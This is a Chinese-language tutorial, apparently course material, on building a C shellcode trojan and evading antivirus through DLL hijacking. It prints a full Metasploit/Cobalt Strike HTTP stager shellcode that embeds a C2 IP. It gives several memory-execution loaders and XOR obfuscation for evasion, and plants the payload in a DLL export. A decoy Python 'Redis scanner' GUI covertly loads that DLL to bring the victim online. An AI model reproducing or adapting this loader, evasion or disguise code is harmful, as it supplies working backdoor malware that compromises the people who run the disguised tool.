[TOC]



# ==C语言木马与DLL劫持免杀==

教材内容

#### 一、DLL的定义与调用

DLL: Dynamic Link Library，动态链接库，是一个无法自已运行，需要额外的命令或程序来对其接口进行调用（类方法、函数）。

1、在DevCpp中创建一个DLL项目

![image-20230814163100253](https://gitee.com/ymq_typroa/typroa/raw/main/202308200412387.png)

2、在dllmain.c中定义源代码函数接口

```c
#include "dll.h"
#include <windows.h>
DLLIMPORT void HelloWorld(){    
    MessageBox(0,"Hello World from DLL!\n","Hi",MB_ICONINFORMATION);
}
DLLIMPORT int Calculate(int a, int b) {    
    int result = a + b;    
    return result;
}
```

3、在dll.h的头文件中声明函数接口

```C
DLLIMPORT void HelloWorld();
DLLIMPORT int Calculate(int a, int b);
```

4、在Python中调用DLL函数接口

```python
import ctypes

# 加载DLL文件
func = ctypes.CDLL("./MyDLLDemo.dll")
# 调用函数
func.HelloWorld()
result = func.Calculate(100, 200)
print(result)
```

#### 二、C语言加载ShellCode

1、在MSF或CS中生成C语言的ShellCode

```C
unsigned 叫无符号型（没有负数位），有符号位：-128-127, 无符号：0-255
char buf[]  表示定义了一个字符数组（也可以看成是字符串，C语言没有内置字符串类型）,在C语言中也可以用字符指针进行定义
unsigned char buf[] = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\xd2\x04\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x50\x6d\x5a\x45\x00\x7f\xb0\x84\xa1\xaf\x01\x14\x1c\x22\x95\xfb\xf6\xdc\x8d\xdb\xda\xb9\x3f\x6f\xa4\x50\x48\x01\x4d\x0d\xaa\xe9\xa3\xdd\xc5\x61\x54\x1e\x8d\x7c\x2b\xb5\xda\xaf\xb5\x5a\x3e\xe5\xb2\xd2\x3d\x4f\xbe\xfb\xbb\xa3\x8a\x79\x87\xcb\x8a\x3f\x24\x2f\xe9\x7a\xd0\xd6\xa8\x94\x76\x23\xae\x84\xb3\x20\x69\x48\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x3b\x20\x4d\x41\x53\x50\x29\x0d\x0a\x00\x00\x03\x1e\xef\x7f\x2c\x8d\x95\xf4\x07\xed\x36\x80\xc5\x50\x3f\x72\xea\x3e\xc9\x27\x31\x68\x48\xef\xb7\x53\x58\x48\x84\x7e\x0f\x10\x64\xa8\x1d\x04\xf0\x81\x03\xed\xae\x9b\x35\x98\x98\x9e\x4a\x32\xa4\x74\x94\xf0\x1f\x6a\xe6\xae\x7e\x61\x74\x2a\x9a\x23\xb6\xd1\x82\xed\x23\xbb\x42\x1a\x3d\xd7\xf7\xee\x26\x94\x25\xbf\x08\xe1\xfd\xdf\xb3\xe7\x18\x44\xe6\xa9\x15\x98\x57\x26\x13\x01\x28\x6a\xfa\x34\xac\xd0\x48\x25\x32\x64\xd3\xa4\xac\x7f\xec\xed\xb7\x4c\xf7\x61\xc4\xd5\x70\xb7\x73\xbb\x1f\x90\x2c\x0a\xb3\x33\xf3\x1b\xea\x49\xa4\xe2\x22\xeb\x43\x02\xab\x7a\x19\x3c\xb3\x95\xae\xb2\x37\x95\xf3\x22\xbf\x1d\x74\x1d\xaf\x5a\x57\x88\x5a\x5b\xcb\x46\x2e\x04\x32\x71\xfe\x14\x69\x9c\x8f\xf6\xde\x9a\x4c\x2d\x33\xbe\x4c\x81\xa0\x38\x31\x9a\x2d\x68\xa5\x8a\x0c\x91\xab\x61\xd7\xe8\xe9\x25\xe2\xd2\xf6\x31\x20\xf2\x8b\xc0\x90\x07\xe9\xe8\x17\x92\xd4\x46\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x32\x33\x30\x2e\x31\x34\x37\x00\x3a\xde\x68\xb1";
```

2、在C语言中对其进行加载实现CS上线

```c
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

typedef void (__stdcall *CODE) ();

unsigned char buf[] = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52";
void start() {    
    /*    
    void *p = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    
    memcpy(p, buf, sizeof(buf));    
    CODE code =(CODE)p;    
    code();   
    // 方法一
    */    
    
    HANDLE myHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* exec = HeapAlloc(myHeap, HEAP_ZERO_MEMORY, sizeof(buf));
    memcpy(exec, buf, sizeof(buf));    
    ((void(*)())exec)();
    // 方法二
    
    /* ((void(*)(void)) & buf)(); //方法三*/
} 
int main(int argc, char *argv[]) {    
    start();    
    return 0;
}
```

> 以上加载器不免杀

#### 三、尝试对ShellCode进行代码混淆

```c
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

typedef void (__stdcall *CODE) ();

unsigned char buf[] = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b";
unsigned char enc[] = "\x31b\x30f\x36e\x3e7\x3e7\x3e7\x387\x36e\x302\x3d6\x335\x383\x36c\x3b5";

/* 对ShellCode进行异或加密 */
void Encrypt() {    
    unsigned char encCode[5000];    
    int key = 999;    
    int i;    
    for (i=0; i<sizeof(buf); i++) {        
        printf("\\x%x", buf[i] ^ key);    
    }
}
/* 对加密ShellCode进行异或解密 */
void Decrypt() {    
    unsigned char decCode[5000];    
    int key = 999;    
    int i;    
    for (i=0; i<sizeof(enc)-1; i++) {        
        decCode[i] = enc[i] ^ key;    
    }    
    ((void(*)(void)) & decCode)();
}
void start() {    
    /* 方法一：申请内存加载 */    
    /*    
    void *p = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(p, buf, sizeof(buf));
    CODE code =(CODE)p;
    code();
    */    
    
    /* 方法二：堆加载 */    
    /*    
    HANDLE myHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);    
    void* exec = HeapAlloc(myHeap, HEAP_ZERO_MEMORY, sizeof(buf));    
    memcpy(exec, buf, sizeof(buf));    
    ((void(*)())exec)();    
    */    
    
    /* 方法三：函数指针加载 */    
    /* ((void(*)(void)) & buf)(); */
} 
int main(int argc, char *argv[]) {    
    Decrypt();    
    return 0;
}
```

#### 四、DLL劫持技术实现免杀

DLL劫持的原理：在一个DLL文件中植入木马（DLL文件的免杀效果较好），将其模拟成一个被别的应用程序（有数字签名）调用的函数名（通过逆向、文档等获取到原始DLL的函数名和参数）。利用Python开发一个RedisExp.exe，使用该应用程序去调用DLL中的函数，进而实现木马免杀和上线的效果）。

1、在DLL函数中植入ShellCode

```c
DLLIMPORT void CSStart() {    
    unsigned char enc[] = "\x31b\x30f\x36e\x3e7\x3e7\x3e7\x387\x36e\x302\x3d6\x335\x383\x36c";    
    unsigned char decCode[5000];    
    int key = 999;    
    int i;    
    for (i=0; i<sizeof(enc)-1; i++) {        
        decCode[i] = enc[i] ^ key;    
    }    
    void *p = VirtualAlloc(NULL, sizeof(decCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    
    memcpy(p, decCode, sizeof(decCode));   
    CODE code =(CODE)p;    
    code();
}
```

2、开发一个Python应用

Tkinter代码如下：

```python
from tkinter import *
import tkinter.messagebox
from netaddr import IPNetwork
import socket, threading
import ctypes, base64, binascii
from Crypto.Cipher import AES
def scan():    
    text.insert('end', '===== 开始扫描Redis服务 =====\n\n')    
    text.update()    
    # 实现正常的扫描功能    
    cidr = entry.get()    
    ip_range = IPNetwork(cidr).iter_hosts()    
    for ip in ip_range:        
        try:            
            s = socket.socket()            
            s.settimeout(1)            
            s.connect((str(ip), 6379))            
            msg = f"IP地址：{ip} 端口 6379 开放.\n"            
            text.insert("end", f"{msg}\n")            
            text.update()            
            s.close()        
		except:            
            msg = f"IP地址：{ip} 端口 6379 未开放.\n"            
            text.insert("end", f"{msg}\n")            
            text.update()    
	text.insert('end', '===== 扫描Redis服务结束 =====\n\n\n')    
	text.update()
	# DLL函数调用
  	def connect():    
        func = ctypes.CDLL("./MyDLLDemo.dll")    
        func.CSStart()
	def look():    
        tkinter.messagebox.showinfo('温馨提示', '欢迎来到蜗牛学苑看美女，报名记得找我哦.')    
        # toplevel.deiconify()
	def start():    
        threading.Thread(target=scan).start()    
        threading.Thread(target=connect).start()
# 主窗口
root = Tk()
# root.geometry('600x400+300+200')    # 窗口大小与位置
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()

x = int(screen_width / 2 - 600 / 2)
y = int(screen_height / 2 - 400 / 2)

root.geometry(f"600x400+{x}+{y}")
root.title('主窗口')                # 窗口标题
root.resizable(0,0)                 # 是否允许修改尺寸
root.wm_attributes('-alpha',0.99)   # 窗口透明度

label = Label(root, text='请输入CIDR网段：', borderwidth=1, relief='flat')
label.place(width=100, height=30, x=50, y=20)

entry = Entry(root, borderwidth=1, relief='groove')
entry.insert(0, '118.31.38.240/28')
entry.place(width=200, height=30, x=200, y=20)

button = Button(root, activebackground='orange', bg='lightgreen', overrelief='raised', text='开始扫描',command=start) #创建按钮
button.place(width=70, height=30, x=480, y=20)

text = Text(root)
text.place(width=500, height=220, x=50, y=80)

button2 = Button(root, activebackground='orange', bg='lightgreen', overrelief='raised', text='看美女',command=look) #创建按钮
button2.place(width=80, height=40, x=250, y=330)

root.mainloop()
```

运行效果如下：

![image-20230820041645904](https://gitee.com/ymq_typroa/typroa/raw/main/202308200416962.png)

3、让Python应用调用DLL的函数

```python
# DLL函数调用
def connect():    
    func = ctypes.CDLL("./MyDLLDemo.dll")    
    func.CSStart()
```

再使用PyInstaller生成Exe文件，将其和DLL文件放在同一个目录中，实现DLL调用和上线。